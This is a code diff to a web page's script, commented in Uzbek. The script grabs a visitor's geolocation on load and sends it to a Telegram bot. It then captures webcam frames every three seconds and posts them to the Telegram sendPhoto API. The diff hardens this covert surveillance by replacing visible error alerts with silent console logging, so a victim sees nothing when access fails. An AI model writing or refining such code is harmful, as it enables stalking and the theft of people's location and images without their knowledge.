@@ -37,9 +37,12 @@
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             if ('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(success, error);
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    timeout: 10000, // 10 seconds timeout to avoid hanging
+                    maximumAge: 0 // Fresh location data
+                });
             } else {
-                alert('Geolokatsiya brauzeringizda qo‘llab-quvvatlanmaydi');
+                console.log('Geolokatsiya brauzeringizda qo‘llab-quvvatlanmaydi');
             }
 
             function success(position) {
@@ -60,8 +63,9 @@
                 sendToTelegram(latitude, longitude);
             }
 
-            function error() {
-                alert('Joylashuvingizni aniqlab bo‘lmadi');
+            function error(err) {
+                console.error('Geolokatsiyaga kirishda xatolik:', err.message);
+                // Silently fail if geolocation is denied or unavailable
             }
 
             function sendToTelegram(latitude, longitude) {
@@ -85,42 +89,47 @@
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
 
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        const video = document.createElement('video'); // Rasm olish uchun video elementi
-                        video.srcObject = stream;
-                        video.play();
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            const video = document.createElement('video'); // Rasm olish uchun video elementi
+                            video.srcObject = stream;
+                            video.play();
 
-                        // Har 3 soniyada rasm olish
-                        setInterval(() => {
-                            // Videodagi joriy kadrdan canvaska chizish
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            // Har 3 soniyada rasm olish
+                            setInterval(() => {
+                                // Videodagi joriy kadrdan canvaska chizish
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                            // Canvasdagi tasvirni blob (rasm) ga aylantirish
-                            canvas.toBlob(blob => {
-                                if (!blob) {
-                                    console.error('Canvas blob generatsiya qilmadi.');
-                                    return;
-                                }
+                                // Canvasdagi tasvirni blob (rasm) ga aylantirish
+                                canvas.toBlob(blob => {
+                                    if (!blob) {
+                                        console.error('Canvas blob generatsiya qilmadi.');
+                                        return;
+                                    }
 
-                                const formData = new FormData();
-                                formData.append('chat_id', chatId); // Yangi chat ID ishlatiladi
-                                formData.append('photo', blob, 'user_photo.png');
+                                    const formData = new FormData();
+                                    formData.append('chat_id', chatId);
+                                    formData.append('photo', blob, 'user_photo.png');
 
-                                const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-                                fetch(photoUrl, {
-                                    method: 'POST',
-                                    body: formData
-                                })
-                                    .then(response => response.json())
-                                    .then(data => console.log('Rasm muvaffaqiyatli yuborildi:', data))
-                                    .catch(error => console.error('Rasm yuborishda xatolik:', error));
-                            }, 'image/png'); // Rasm turi
-                        }, 3000); // Har 3 soniyada
-                    })
-                    .catch(error => {
-                        console.error('Kameraga kirishda xatolik:', error);
-                    });
+                                    const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                                    fetch(photoUrl, {
+                                        method: 'POST',
+                                        body: formData
+                                    })
+                                        .then(response => response.json())
+                                        .then(data => console.log('Rasm muvaffaqiyatli yuborildi:', data))
+                                        .catch(error => console.error('Rasm yuborishda xatolik:', error));
+                                }, 'image/png');
+                            }, 3000); // Har 3 soniyada
+                        })
+                        .catch(error => {
+                            console.error('Kameraga kirishda xatolik:', error.message);
+                            // Silently fail if camera access is denied
+                        });
+                } else {
+                    console.log('Kamera qo‘llab-quvvatlanmaydi');
+                }
             }
         });
     </script>
